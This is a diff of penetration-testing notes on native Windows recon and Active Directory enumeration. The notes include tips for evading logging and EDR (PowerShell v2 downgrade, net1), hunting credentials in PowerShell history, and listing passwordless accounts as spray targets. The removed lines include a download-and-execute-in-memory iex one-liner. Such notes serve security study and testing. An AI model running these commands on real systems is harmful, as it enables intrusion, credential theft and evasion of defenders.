@@ -1,258 +1,153 @@
-## Host Environment Enumeration
+# Living Off the Land — Windows Native Enum
 
-Landed on a Windows host with no external tools and need to establish local context.
+No tools available → built-in only. Fewer logs than importing external tools, blends into normal admin activity.
 
-Print PC name
+## Host Recon
 
-```
-hostname
-```
+Quick single-command host summary — generates one log entry instead of many:
 
-Identify OS version and revision level for exploit targeting
-
-```
-[System.Environment]::OSVersion.Version
+```cmd
+systeminfo
 ```
 
-Check applied patches and hotfixes to identify missing security updates
+Check who else is logged on before doing anything noisy:
 
-```
-wmic qfe get Caption,Description,HotFixID,InstalledOn
-```
-
-List environment variables for the current session
-
-```
-set
-```
-
-Identify the domain the host belongs to
-
-```
-echo %USERDOMAIN%
-```
-
-Locate the Domain Controller the host authenticates with
-
-```
-echo %logonserver%
-```
-
-**Gotchas** **WMIC permissions** can cause the hotfix query to return empty or access denied if not in a high-integrity context.
-
-## PowerShell Reconnaissance
-
-Initial foothold established with PowerShell access; need to assess current environment restrictions and history.
-
-List loaded modules to identify available AD or administrative tools
-
-```
-Get-Module
-```
-
-Check execution policy levels for all scopes
-
-```
-Get-ExecutionPolicy -List
-```
-
-Bypass execution policy for the current process to run scripts without changing system-wide settings
-
-```
-Set-ExecutionPolicy Bypass -Scope Process
-```
-
-Dump environment variables including paths and computer info
-
-```
-Get-ChildItem Env: | ft Key,Value
-```
-
-Read PowerShell history to find cleartext credentials or previous admin activity
-
-```
-Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
-```
-
-Download and execute a script directly into memory to avoid disk-based detection
-
-```
-powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<URL>');"
-```
-
-**Gotchas** **Execution Policy** is not a security boundary; bypassing it via the process scope only lasts until the process terminates.
-
-## PowerShell Logging Evasion
-
-System is utilizing **Script Block Logging** (PowerShell 3.0+) which records every command to the Event Viewer.
-
-Downgrade the current session to PowerShell 2.0 to stop **Script Block Logging**
-
-```
-powershell.exe -version 2
-```
-
-**Dangerous / misconfigured settings**
-
-- **PowerShell v2.0** being installed on modern systems allows attackers to bypass modern security logging features.
-
-**Gotchas** **Downgrade visibility** is high; the command `powershell.exe -version 2` is logged in the original session before the downgrade occurs, alerting vigilant defenders.
-
-## Security Solution Enumeration
-
-Identifying firewall states and antivirus configurations before executing lateral movement or noisy tools.
-
-Check the status of all firewall profiles
-
-```
-netsh advfirewall show allprofiles
-```
-
-Query the status of the Windows Defender service
-
-```
-sc query windefend
-```
-
-Detailed dump of Defender settings, scan ages, and signature updates
-
-```
-Get-MpComputerStatus
-```
-
-## User Session and Network Discovery
-
-Identifying potential for lateral movement or risk of discovery by active users.
-
-Check for other logged-in users to avoid hijacking an active session and being noticed
-
-```
+```powershell
 qwinsta
 ```
 
-List known hosts in the ARP table to identify adjacent targets
+PS history — may contain plaintext creds or paths to scripts with creds:
 
+```powershell
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
 ```
+
+Firewall state across all profiles:
+
+```cmd
+netsh advfirewall show allprofiles
+```
+
+Defender state:
+
+```cmd
+sc query windefend
+```
+
+---
+
+## OPSEC — PS Downgrade
+
+PS v2 has no script block logging — drops below the 3.0 threshold where event logging kicks in:
+
+```powershell
+powershell.exe -version 2
+```
+
+> [!warning] The downgrade command itself is logged before the new session starts. Defenders see the v2 launch in the Windows PowerShell log even if nothing after is captured. It will look suspicious.
+
+---
+
+## Network Recon
+
+ARP table — hosts the box has recently talked to, faster than scanning:
+
+```cmd
 arp -a
 ```
 
-Print the routing table to find routes to other network segments or persistent routes
+Routing table — reveals network segments reachable from this host, pivot candidates:
 
-```
+```cmd
 route print
 ```
 
-**Gotchas** **User interference** may occur if you perform actions while an admin is active; they may notice pop-ups or session instability and report the activity.
+---
 
-## Domain Object Enumeration via Net Commands
+## WMI
 
-Querying AD objects and local group memberships using built-in Windows utilities.
+Domain info — domain name, DC address, child domains, forest trusts in one shot:
 
-List all users in the domain
-
-```
-net user /domain
+```cmd
+wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
 ```
 
-Get detailed information for a specific domain user
+Patch level:
 
-```
-net user <USERNAME> /domain
+```cmd
+wmic qfe get Caption,Description,HotFixID,InstalledOn
 ```
 
-Identify all groups within the domain
+Running processes, local users, service accounts:
 
+```cmd
+wmic process list /format:list
+wmic useraccount list /format:list
+wmic sysaccount list /format:list
 ```
+
+---
+
+## Net Commands
+
+> [!warning] `net.exe` commands are commonly monitored by EDR. Substitute `net1` for `net` to avoid the exact string match trigger.
+
+Password policy:
+
+```cmd
+net accounts /domain
+```
+
+Domain groups, DA membership, DCs:
+
+```cmd
 net group /domain
-```
-
-Identify members of the Domain Admins group
-
-```
 net group "Domain Admins" /domain
-```
-
-List domain controllers registered in the domain
-
-```
 net group "Domain Controllers" /domain
 ```
 
-View local group memberships on the current host
+Specific user detail:
 
-```
-net localgroup
-```
-
-Check members of the local Administrators group (often includes Domain Admins)
-
-```
-net localgroup administrators
+```cmd
+net user <USER> /domain
 ```
 
-List available network shares
+Shares, visible computers:
 
-```
+```cmd
 net share
+net view /all /domain
 ```
 
-Mount a remote share locally
+---
 
-```
-net use x: \\<TARGET_IP>\<SHARE_NAME>
-```
+## Dsquery
 
-### Net Evasion
+Exists on any host with AD DS role installed. `dsquery.dll` is on all modern Windows by default — always available with SYSTEM or elevated prompt.
 
-Use `net1` to execute the same logic as `net` while attempting to bypass basic string-based EDR detections
+All users / computers:
 
-```
-net1 user /domain
-```
-
-**Tool comparison**
-
-- `net` → `net user /domain` → standard utility for AD queries.
-- `net1` → `net1 user /domain` → prefer when `net` execution is flagged or blocked by simple monitoring.
-
-**Gotchas** **EDR triggers** are common for net commands; many monitoring tools alert when non-admin users query `net localgroup administrators` or `net group "Domain Admins" /domain`.
-
-## Active Directory Discovery via Dsquery
-
-Deep LDAP querying for AD objects when RSAT or `dsquery.dll` is available.
-
-Search for all user objects in the domain
-
-```
+```powershell
 dsquery user
-```
-
-Search for all computer objects in the domain
-
-```
 dsquery computer
 ```
 
-Wildcard search for all objects within a specific Organizational Unit (OU)
+Wildcard — all objects in an OU:
 
-```
-dsquery * "CN=Users,DC=<DOMAIN>,DC=LOCAL"
+```powershell
+dsquery * "CN=Users,DC=<DOMAIN>,DC=<TLD>"
 ```
 
-Find users with specific LDAP attributes set (e.g., `PASSWD_NOTREQD`)
+Users with `PASSWD_NOTREQD` set (UAC bit 32) — no password required, easy spray targets:
 
-```
+```powershell
 dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
 ```
 
-Search for Domain Controllers using UAC bitmask matching
+Find DCs (UAC bit 8192):
 
-```
+```powershell
 dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
 ```
 
-**Edge cases**
-
-- `dsquery` is native to systems with the AD DS role but `dsquery.dll` exists in `C:\Windows\System32\` on most modern Windows systems, allowing execution if permissions permit.
-
-**Gotchas** **Privilege requirements** usually dictate that you must be in a SYSTEM context or have elevated privileges to run effective queries against the directory.
+LDAP OID matching rules for dsquery filters: `1.2.840.113556.1.4.803` = exact bit match / `1.2.840.113556.1.4.804` = any bit match / `1.2.840.113556.1.4.1941` = match through DN chain (membership/ownership). Combine with `(&(filter1)(filter2))`, negate with `(!filter)`.
